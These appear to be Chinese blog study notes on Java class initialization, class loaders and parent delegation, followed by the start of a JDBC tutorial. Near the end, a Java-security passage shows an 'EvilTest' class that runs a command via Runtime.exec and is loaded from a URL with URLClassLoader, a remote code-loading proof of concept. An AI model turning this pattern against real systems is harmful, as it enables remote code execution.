<p>2、访问类的静态变量(除常量【被final修辞的静态变量】原因:常量一种特殊的变量，因为编译器把他们当作值(value)而不是域(field)来对待。如果你的代码中用到了常变量(constant variable)，编译器并不会生成字节码来从对象中载入域的值，而是直接把这个值插入到字节码中。这是一种很有用的优化，但是如果你需要改变final域的值那么每一块用到那个域的代码都需要重新编译。</p>
<figure class="highlight monkey"><table><tr><td class="code"><pre><span class="line">在这里，<span class="string">&quot;值&quot;</span>（value）和<span class="string">&quot;域&quot;</span>（<span class="keyword">field</span>）是针对常量（<span class="keyword">final</span>）变量的不同概念。</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>. 值（value）：值指的是常量的实际数值或数据。当编译器遇到常量（<span class="keyword">final</span>）变量时，它会直接将该变量的值插入到生成的字节码中，而不是将对变量的引用作为字节码指令的操作数。</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>. 域（<span class="keyword">field</span>）：域指的是类中的成员变量。它是类的一部分，用于存储对象的状态或数据。域可以是实例变量（即每个对象都有自己的一份）或静态变量（类共享的变量）。</span><br><span class="line"></span><br><span class="line">   域是在类的定义中声明的，它指定了变量的类型和名称。域用于存储对象的数据，可以通过对象的引用访问和修改。</span><br><span class="line"></span><br><span class="line">对于常量（<span class="keyword">final</span>）变量，编译器会对其特殊处理，将其作为常量值直接插入到字节码中。这样做的好处是避免了对常量变量的反复访问，提高了性能。但是，由于常量的值在编译时已经确定，并且被硬编码到生成的字节码中，因此无法通过重新编译来改变常量的值。</span><br></pre></td></tr></table></figure>

<p>总结一下：</p>
<ul>
<li>值（value）指的是常量的实际数值或数据，而不是对变量的引用。</li>
<li>域（field）是类中的成员变量，用于存储对象的状态或数据。域可以是实例变量或静态变量。</li>
<li>对于常量（final）变量，编译器将其值直接插入到字节码中，而不是将对变量的引用插入。这种优化提高了性能，但也导致了无法改变常量值的限制。</li>
</ul>
<p>3、访问类的静态方法</p>
<p>4、反射如(Class.forName(“my.xyz.Test”))</p>
<p>5、当初始化一个类时，发现其父类还未初始化，则先出发父类的初始化</p>
<p>6、虚拟机启动时，定义了main()方法的那个类先初始化</p>
<p>7、JDK 1.7 动态语⾔⽀持：⼀个java.lang.invoke.MethodHandle 的解析结果为 REF_getStatic 、REF_putStatic 、 REF_invokeStati</p>
<p>以上情况称为称对一个类进行“主动引用”，除此种情况之外，均不会触发类的初始化，称为“被动引用” 接口的加载过程与类的加载过程稍有不同。接口中不能使用static{}块。当一个接口在初始化时，并不要求其父接口全部都完成了初始化，只有真正在使用到父接口时（例如引用接口中定义的常量）才会初始化。</p>
<p><strong>被动引用例子</strong></p>
<p>1、子类调用父类的静态变量，子类不会被初始化。只有父类被初始化。对于静态字段，只有直接定义这个字段的类才会被初始化.</p>
<p>2、通过数组定义来引用类，不会触发类的初始化</p>
<p>3、 访问类的常量，不会初始化类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SuperClass</span> &#123;  </span><br><span class="line">    <span class="keyword">static</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;superclass init&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">value</span> <span class="operator">=</span> <span class="number">123</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SubClass</span> <span class="keyword">extends</span> <span class="title class_">SuperClass</span> &#123;  </span><br><span class="line">    <span class="keyword">static</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;subclass init&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        System.out.println(SubClass.value);<span class="comment">// 被动应用1  </span></span><br><span class="line">        SubClass[] sca = <span class="keyword">new</span> <span class="title class_">SubClass</span>[<span class="number">10</span>];<span class="comment">// 被动引用2  </span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>

<p>程序运行输出 superclass init 123 从上面的输入结果证明了被动引用1与被动引用2</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ConstClass</span> &#123;  </span><br><span class="line">    <span class="keyword">static</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;ConstClass init&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">HELLOWORLD</span> <span class="operator">=</span> <span class="string">&quot;hello world&quot;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        System.out.println(ConstClass.HELLOWORLD);<span class="comment">// 调用类常量  </span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>

<p>面很详细的介绍了类的加载时机和类的加载过程，通过上面的理论来分析本文开门见上的题目</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SingleTon</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">SingleTon</span> <span class="variable">singleTon</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SingleTon</span>();  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> count1;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">count2</span> <span class="operator">=</span> <span class="number">0</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">SingleTon</span><span class="params">()</span> &#123;  </span><br><span class="line">        count1++;  </span><br><span class="line">        count2++;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> SingleTon <span class="title function_">getInstance</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> singleTon;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">SingleTon</span> <span class="variable">singleTon</span> <span class="operator">=</span> SingleTon.getInstance();  </span><br><span class="line">        System.out.println(<span class="string">&quot;count1=&quot;</span> + singleTon.count1);  </span><br><span class="line">        System.out.println(<span class="string">&quot;count2=&quot;</span> + singleTon.count2);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>

<p>分析:</p>
<p>1:SingleTon singleTon &#x3D; SingleTon.getInstance();调用了类的SingleTon调用了类的静态方法，触发类的初始化</p>
<p>2:类加载的时候在准备过程中为类的静态变量分配内存并初始化默认值 singleton&#x3D;null count1&#x3D;0,count2&#x3D;0</p>
<p>3:类初始化化，为类的静态变量赋值和执行静态代码快。singleton赋值为new SingleTon()调用类的构造方法</p>
<p>4:调用类的构造方法后count&#x3D;1;count2&#x3D;1</p>
<p>5:继续为count1与count2赋值,此时count1没有赋值操作,所有count1为1,但是count2执行赋值操作就变为0</p>
<h1 id="类初始化顺序"><a href="#类初始化顺序" class="headerlink" title="类初始化顺序"></a>类初始化顺序</h1><p>现在我们知道什么时候触发类的初始化了，他精确地写在Java语言规范中。但了解清楚 域（fields，静态的还是非静态的）、块（block静态的还是非静态的）、不同类（子类和超类）和不同的接口（子接口，实现类和超接口）的初始化顺序也很重要类。事实上很多核心Java面试题和SCJP问题都是基于这些概念，下面是类初始化的一些规则：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">1</span>.类从顶至底的顺序初始化，所以声明在顶部的字段的早于底部的字段初始化</span><br><span class="line"><span class="attribute">2</span>.超类早于子类和衍生类的初始化</span><br><span class="line"><span class="attribute">3</span>.如果类的初始化是由于访问静态域而触发，那么只有声明静态域的类才被初始化，而不会触发超类的初始化或者子类的<span class="number">4</span>.初始化即使静态域被子类或子接口或者它的实现类所引用。</span><br><span class="line"><span class="attribute">5</span>.接口初始化不会导致父接口的初始化。</span><br><span class="line"><span class="attribute">6</span>.静态域的初始化是在类的静态初始化期间，非静态域的初始化时在类的实例创建期间。这意味这静态域初始化在非静态域之前。</span><br><span class="line"><span class="attribute">7</span>.非静态域通过构造器初始化，子类在做任何初始化之前构造器会隐含地调用父类的构造器，他保证了非静态或实例变量（父类）初始</span><br></pre></td></tr></table></figure>

<p>原文链接：</p>
<p>类加载举例：<a href="http://blog.csdn.net/mrzhoug/article/details/51581994">http://blog.csdn.net/mrzhoug/article/details/51581994</a></p>
<h1 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h1><p>JVM设计者把类加载阶段中的“通过’类全名’来获取定义此类的二进制字节流”这个动作放到Java虚拟机外部去实现，以便让应用程序自己决定如何去获取所需要的类。实现这个动作的代码模块称为“类加载器”。</p>
<p><strong>1.类与类加载器</strong></p>
<p>对于任何一个类，都需要由加载它的类加载器和这个类来确立其在JVM中的唯一性。也就是说，两个类来源于同一个Class文件，并且被同一个类加载器加载，这两个类才相等。</p>
<p><strong>2.双亲委派模型</strong></p>
<p>从虚拟机的角度来说，只存在两种不同的类加载器：一种是启动类加载器（Bootstrap ClassLoader），该类加载器使用C++语言实现，属于虚拟机自身的一部分。另外一种就是所有其它的类加载器，这些类加载器是由Java语言实现，独立于JVM外部，并且全部继承自抽象类java.lang.ClassLoader。</p>
<p>从Java开发人员的角度来看，大部分Java程序一般会使用到以下三种系统提供的类加载器：</p>
<p>1)启动类加载器（Bootstrap ClassLoader）：负责加载JAVA_HOME\lib目录中并且能被虚拟机识别的类库到JVM内存中，如果名称不符合的类库即使放在lib目录中也不会被加载。该类加载器无法被Java程序直接引用。</p>
<p>2)扩展类加载器（Extension ClassLoader）：该加载器主要是负责加载JAVA_HOME\lib\，该加载器可以被开发者直接使用。</p>
<p>3)应用程序类加载器（Application ClassLoader）：该类加载器也称为系统类加载器，它负责加载用户类路径（Classpath）上所指定的类库，开发者可以直接使用该类加载器，如果应用程序中没有自定义过自己的类加载器，一般情况下这个就是程序中默认的类加载器。</p>
<p>我们的应用程序都是由这三类加载器互相配合进行加载的，我们也可以加入自己定义的类加载器。这些类加载器之间的关系如下图所示：</p>
<p>如上图所示的类加载器之间的这种层次关系，就称为类加载器的双亲委派模型（Parent Delegation Model）。该模型要求除了顶层的启动类加载器外，其余的类加载器都应当有自己的父类加载器。子类加载器和父类加载器不是以继承（Inheritance）的关系来实现，而是通过组合（Composition）关系来复用父加载器的代码。</p>
<p>双亲委派模型的工作过程为：如果一个类加载器收到了类加载的请求，它首先不会自己去尝试加载这个类，而是把这个请求委派给父类加载器去完成，每一个层次的加载器都是如此，因此所有的类加载请求都会传给顶层的启动类加载器，只有当父加载器反馈自己无法完成该加载请求（该加载器的搜索范围中没有找到对应的类）时，子加载器才会尝试自己去加载。</p>
<p>使用这种模型来组织类加载器之间的关系的好处是Java类随着它的类加载器一起具备了一种带有优先级的层次关系。例如java.lang.Object类，无论哪个类加载器去加载该类，最终都是由启动类加载器进行加载，因此Object类在程序的各种类加载器环境中都是同一个类。否则的话，如果不使用该模型的话，如果用户自定义一个java.lang.Object类且存放在classpath中，那么系统中将会出现多个Object类，应用程序也会变得很混乱。如果我们自定义一个rt.jar中已有类的同名Java类，会发现JVM可以正常编译，但该类永远无法被加载运行。 在rt.jar包中的java.lang.ClassLoader类中，我们可以查看类加载实现过程的代码，具体源码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">synchronized</span> Class <span class="title function_">loadClass</span><span class="params">(String name, <span class="type">boolean</span> resolve)</span>  </span><br><span class="line">        <span class="keyword">throws</span> ClassNotFoundException &#123;  </span><br><span class="line">    <span class="comment">// 首先检查该name指定的class是否有被加载  </span></span><br><span class="line">    <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> findLoadedClass(name);  </span><br><span class="line">    <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="keyword">if</span> (parent != <span class="literal">null</span>) &#123;  </span><br><span class="line">                <span class="comment">// 如果parent不为null，则调用parent的loadClass进行加载  </span></span><br><span class="line">                c = parent.loadClass(name, <span class="literal">false</span>);  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                <span class="comment">// parent为null，则调用BootstrapClassLoader进行加载  </span></span><br><span class="line">                c = findBootstrapClass0(name);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;  </span><br><span class="line">            <span class="comment">// 如果仍然无法加载成功，则调用自身的findClass进行加载  </span></span><br><span class="line">            c = findClass(name);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> (resolve) &#123;  </span><br><span class="line">        resolveClass(c);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> c;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>

<p><strong>3.自定义类加载器</strong></p>
<p>若要实现自定义类加载器，只需要继承java.lang.ClassLoader 类，并且重写其findClass()方法即可。java.lang.ClassLoader 类的基本职责就是根据一个指定的类的名称，找到或者生成其对应的字节代码，然后从这些字节代码中定义出一个 Java 类，即 java.lang.Class 类的一个实例。除此之外，ClassLoader 还负责加载 Java 应用所需的资源，如图像文件和配置文件等，ClassLoader 中与加载类相关的方法如下：</p>
<p>方法说明 getParent()  返回该类加载器的父类加载器。</p>
<p>loadClass(String name) 加载名称为 二进制名称为name 的类，返回的结果是 java.lang.Class 类的实例。</p>
<p>findClass(String name) 查找名称为 name 的类，返回的结果是 java.lang.Class 类的实例。</p>
<p>findLoadedClass(String name) 查找名称为 name 的已经被加载过的类，返回的结果是 java.lang.Class 类的实例。</p>
<p>resolveClass(Class&lt;?&gt; c) 链接指定的 Java 类。</p>
<p>注意：在JDK1.2之前，类加载尚未引入双亲委派模式，因此实现自定义类加载器时常常重写loadClass方法，提供双亲委派逻辑，从JDK1.2之后，双亲委派模式已经被引入到类加载体系中，自定义类加载器时不需要在自己写双亲委派的逻辑，因此不鼓励重写loadClass方法，而推荐重写findClass方法。</p>
<p>在Java中，任意一个类都需要由加载它的类加载器和这个类本身一同确定其在java虚拟机中的唯一性，即比较两个类是否相等，只有在这两个类是由同一个类加载器加载的前提之下才有意义，否则，即使这两个类来源于同一个Class类文件，只要加载它的类加载器不相同，那么这两个类必定不相等(这里的相等包括代表类的Class对象的equals()方法、isAssignableFrom()方法、isInstance()方法和instanceof关键字的结果)。例子代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment">     * 一、ClassLoader加载类的顺序 </span></span><br><span class="line"><span class="comment">     *  1.调用 findLoadedClass(String) 来检查是否已经加载类。 </span></span><br><span class="line"><span class="comment">     *  2.在父类加载器上调用 loadClass 方法。如果父类加载器为 null，则使用虚拟机的内置类加载器。 </span></span><br><span class="line"><span class="comment">     *  3.调用 findClass(String) 方法查找类。 </span></span><br><span class="line"><span class="comment">     * 二、实现自己的类加载器 </span></span><br><span class="line"><span class="comment">     *  1.获取类的class文件的字节数组 </span></span><br><span class="line"><span class="comment">     *  2.将字节数组转换为Class类的实例 </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@author</span> lei 2011-9-1 </span></span><br><span class="line"><span class="comment">     */</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassLoaderTest</span> &#123;  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InstantiationException, IllegalAccessException, ClassNotFoundException &#123;  </span><br><span class="line">            <span class="comment">//新建一个类加载器  </span></span><br><span class="line">            <span class="type">MyClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClassLoader</span>(<span class="string">&quot;myClassLoader&quot;</span>);  </span><br><span class="line">            <span class="comment">//加载类，得到Class对象  </span></span><br><span class="line">            Class&lt;?&gt; clazz = cl.loadClass(<span class="string">&quot;classloader.Animal&quot;</span>);  </span><br><span class="line">            <span class="comment">//得到类的实例  </span></span><br><span class="line">            Animal animal=(Animal) clazz.newInstance();  </span><br><span class="line">            animal.say();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Animal</span>&#123;  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">say</span><span class="params">()</span>&#123;  </span><br><span class="line">            System.out.println(<span class="string">&quot;hello world!&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">MyClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;  </span><br><span class="line">        <span class="comment">//类加载器的名称  </span></span><br><span class="line">        <span class="keyword">private</span> String name;  </span><br><span class="line">        <span class="comment">//类存放的路径  </span></span><br><span class="line">        <span class="keyword">private</span> <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;E:\\workspace\\Algorithm\\src&quot;</span>;  </span><br><span class="line">        MyClassLoader(String name) &#123;  </span><br><span class="line">            <span class="built_in">this</span>.name = name;  </span><br><span class="line">        &#125;  </span><br><span class="line">        MyClassLoader(ClassLoader parent, String name) &#123;  </span><br><span class="line">            <span class="built_in">super</span>(parent);  </span><br><span class="line">            <span class="built_in">this</span>.name = name;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="comment">/** </span></span><br><span class="line"><span class="comment">         * 重写findClass方法 </span></span><br><span class="line"><span class="comment">         */</span>  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> Class&lt;?&gt; findClass(String name) &#123;  </span><br><span class="line">            <span class="type">byte</span>[] data = loadClassData(name);  </span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.defineClass(name, data, <span class="number">0</span>, data.length);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">public</span> <span class="type">byte</span>[] loadClassData(String name) &#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                name = name.replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;//&quot;</span>);  </span><br><span class="line">                <span class="type">FileInputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(path + name + <span class="string">&quot;.class&quot;</span>));  </span><br><span class="line">                <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">                <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">0</span>;  </span><br><span class="line">                <span class="keyword">while</span> ((b = is.read()) != -<span class="number">1</span>) &#123;  </span><br><span class="line">                    baos.write(b);  </span><br><span class="line">                &#125;  </span><br><span class="line">                <span class="keyword">return</span> baos.toByteArray();  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">                e.printStackTrace();  </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>类加载器双亲委派模型是从JDK1.2以后引入的，并且只是一种推荐的模型，不是强制要求的，因此有一些没有遵循双亲委派模型的特例：(了解)</p>
<p>(1).在JDK1.2之前，自定义类加载器都要覆盖loadClass方法去实现加载类的功能，JDK1.2引入双亲委派模型之后，loadClass方法用于委派父类加载器进行类加载，只有父类加载器无法完成类加载请求时才调用自己的findClass方法进行类加载，因此在JDK1.2之前的类加载的loadClass方法没有遵循双亲委派模型，因此在JDK1.2之后，自定义类加载器不推荐覆盖loadClass方法，而只需要覆盖findClass方法即可。</p>
<p>(2).双亲委派模式很好地解决了各个类加载器的基础类统一问题，越基础的类由越上层的类加载器进行加载，但是这个基础类统一有一个不足，当基础类想要调用回下层的用户代码时无法委派子类加载器进行类加载。为了解决这个问题JDK引入了ThreadContext线程上下文，通过线程上下文的setContextClassLoader方法可以设置线程上下文类加载器。</p>
<p>JavaEE只是一个规范，sun公司只给出了接口规范，具体的实现由各个厂商进行实现，因此JNDI，JDBC,JAXB等这些第三方的实现库就可以被JDK的类库所调用。线程上下文类加载器也没有遵循双亲委派模型。</p>
<p>(3).近年来的热码替换，模块热部署等应用要求不用重启java虚拟机就可以实现代码模块的即插即用，催生了OSGi技术，在OSGi中类加载器体系被发展为网状结构。OSGi也没有完全遵循双亲委派模型。</p>
<p><strong>4.动态加载Jar &amp;&amp; ClassLoader 隔离问题</strong></p>
<p>动态加载Jar：</p>
<p>Java 中动态加载 Jar 比较简单，如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">URL[] urls = <span class="keyword">new</span> <span class="title class_">URL</span>[] &#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;file:libs/jar1.jar&quot;</span>)&#125;;  </span><br><span class="line"><span class="type">URLClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(urls, parentLoader);  </span><br></pre></td></tr></table></figure>

<p>ClassLoader 隔离问题：</p>
<p>大家觉得一个运行程序中有没有可能同时存在两个包名和类名完全一致的类？ JVM 及 Dalvik 对类唯一的识别是 ClassLoader id + PackageName + ClassName，所以一个运行程序中是有可能存在两个包名和类名完全一致的类的。并且如果这两个”类”不是由一个 ClassLoader 加载，是无法将一个类的示例强转为另外一个类的，这就是 ClassLoader 隔离。 如 Android 中碰到如下异常 [java] view plain copy</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">android.support.v4.view.ViewPager can not be cast to android.support.v4.view.ViewPager  </span><br></pre></td></tr></table></figure>

<p>当碰到这种问题时可以通过 instance.getClass().getClassLoader(); 得到 ClassLoader，看 ClassLoader 是否一样。</p>
<p>加载不同 Jar 包中公共类：</p>
<p>现在 Host 工程包含了 common.jar, jar1.jar, jar2.jar，并且 jar1.jar 和 jar2.jar 都包含了 common.jar，我们通过 ClassLoader 将 jar1, jar2 动态加载进来，这样在 Host 中实际是存在三份 common.jar，如下图：</p>
<p><img src="https://baicany.github.io/images/14301963930_2f0f0fe8aa_o.png" alt="img"></p>
<p>我们怎么保证 common.jar 只有一份而不会造成上面3中提到的 ClassLoader 隔离的问题呢，其实很简单，在生成 jar1 和 jar2 时把 common.jar 去掉，只保留 host 中一份，以 host ClassLoader 为 parentClassLoader 即可。</p>
<p><strong>一道面试题</strong></p>
<p>能不能自己写个类叫java.lang.System？</p>
<p>答案：通常不可以，但可以采取另类方法达到这个需求。 解释：为了不让我们写System类，类加载采用委托机制，这样可以保证爸爸们优先，爸爸们能找到的类，儿子就没有机会加载。而System类是Bootstrap加载器加载的，就算自己重写，也总是使用Java系统提供的System，自己写的System类根本没有机会得到加载。</p>
<p>但是，我们可以自己定义一个类加载器来达到这个目的，为了避免双亲委托机制，这个类加载器也必须是特殊的。由于系统自带的三个类加载器都加载特定目录下的类，如果我们自己的类加载器放在一个特殊的目录，那么系统的加载器就无法加载，也就是最终还是由我们自己的加载器加载。</p>
<h3 id="ClassLoader的核心方法"><a href="#ClassLoader的核心方法" class="headerlink" title="ClassLoader的核心方法"></a>ClassLoader的核心方法</h3><p>ClassLoader类有如下核心方法：</p>
<p>loadClass(加载指定的Java类)<br>findClass(查找指定的Java类)<br>findLoadedClass(查找JVM已经加载过的类)<br>defineClass(定义一个Java类)<br>resolveClass(链接指定的Java类)</p>
<h3 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h3><p>在 Java 安全中，<code>java.net.URLClassLoader.class</code> 这个类加载器是比较常用的，我们可以通过该类加载器来加载本地磁盘或者网络传输的 Class 文件。比如写一个EvilTest.java：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">root<span class="meta">@iZbp14tgce8absspjkxi3iZ</span>:~# cat EvilTest.java</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilTest</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">EvilTest</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">root<span class="meta">@iZbp14tgce8absspjkxi3iZ</span>:~# javac EvilTest.java</span><br><span class="line">root<span class="meta">@iZbp14tgce8absspjkxi3iZ</span>:~#</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后利用<code>URLClassLoader</code>进行加载：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test2</span><span class="params">()</span> <span class="keyword">throws</span> MalformedURLException, ClassNotFoundException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">    <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://127.0.0.1/&quot;</span>);</span><br><span class="line">    <span class="type">URLClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;url&#125;);</span><br><span class="line">    <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> classLoader.loadClass(<span class="string">&quot;EvilTest&quot;</span>);</span><br><span class="line">    clazz.newInstance();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>jdbc</title>
    <url>/2023/10/25/jdbc/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>好久没更新了www,因为一直在打ctf,还有上课</p>
<h1 id="Java-JDBC"><a href="#Java-JDBC" class="headerlink" title="Java JDBC"></a>Java JDBC</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Java Database Connetivity，Java数据库连接，是Java提供对数据库进⾏连接、操作的标准API。</p>
<h2 id="相关类和接⼝"><a href="#相关类和接⼝" class="headerlink" title="相关类和接⼝"></a>相关类和接⼝</h2><ul>
<li><p>java.sql.DriverManager</p>
</li>
<li><p>Java通过java.sql.DriverManager来管理所⽤数据库的驱动注册，提供getConnection⽅法来连接数据库</p>
</li>
<li><p>java.sql.Driver<br>负责实现对数据库的连接，所以数据库驱动包都必须实现这个接⼝才能完成数据库连接操作。</p>
</li>
<li><p>java.sql.Connection<br>通过java.sql.DriverManager.getConnection⽅法成功连接数据库后，会返回⼀个java.sql.Connection数据库连接对象，⼀切对数据库的查询操作都将依赖于这个对象</p>
</li>
</ul>
<h2 id="简单的数据库连接"><a href="#简单的数据库连接" class="headerlink" title="简单的数据库连接"></a>简单的数据库连接</h2><p>我这里是用过小皮自带的mysql启动的mysql服务</p>
<p>JDBC连接数据库的⼀般步骤：</p>
<ol>
<li><p>注册驱动</p>
</li>
<li><p>获取连接</p>
</li>
</ol>
<p><strong>⽰例代码</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">CLASS_NAME</span> <span class="operator">=</span> <span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">URL</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://localhost:3306/baicany&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">USERNAME</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">PASSWORD</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line"></span><br><span class="line">Class.forName(CLASS_NAME);<span class="comment">// 注册驱动类</span></span><br><span class="line"></span><br><span class="line"><span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(URL, USERNAME, PASSWORD);</span><br></pre></td></tr></table></figure>

<p>对于URL常量 jdbc:mysql:&#x2F;&#x2F; 表⽰要连接的数据库类型mysql， localhost:3306 为mysql服务地址， baicany 为要连接的数据库名</p>
<p><strong>简单查询</strong></p>
